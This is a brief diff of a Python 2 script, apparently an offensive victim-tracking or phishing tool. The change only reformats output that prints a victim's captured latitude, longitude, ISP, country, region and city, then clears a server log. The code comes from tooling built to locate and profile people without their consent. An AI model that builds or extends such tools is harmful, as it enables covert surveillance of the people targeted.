@@ -155,10 +155,10 @@ def waitCreds():
             latitude = matchObj.group(1)
             longitude = matchObj.group(2)
             print '======================================================================'.format(RED, END)
-            print ' {0}[ VICTIM INFO FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines
-            print ' {0}Longitude: %s Latitude: %s{1}'.format(GREEN, END) % (longitude, latitude)
-            print ' {0}ISP: %s Country: %s{1}'.format(GREEN, END) % (ipinfo['org'], ipinfo['country'])
-            print ' {0}Region: %s City: %s{1}'.format(GREEN, END) % (ipinfo['region'], ipinfo['city'])
+            print ' \n{0}[ VICTIM INFO FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines
+            print ' \n{0}Longitude: %s \nLatitude: %s{1}'.format(GREEN, END) % (longitude, latitude)
+            print ' \n{0}ISP: %s \nCountry: %s{1}'.format(GREEN, END) % (ipinfo['org'], ipinfo['country'])
+            print ' \n{0}Region: %s \nCity: %s{1}'.format(GREEN, END) % (ipinfo['region'], ipinfo['city'])
             system('rm -rf Server/www/ip.txt && touch Server/www/ip.txt')
             print '======================================================================'.format(RED, END)
             
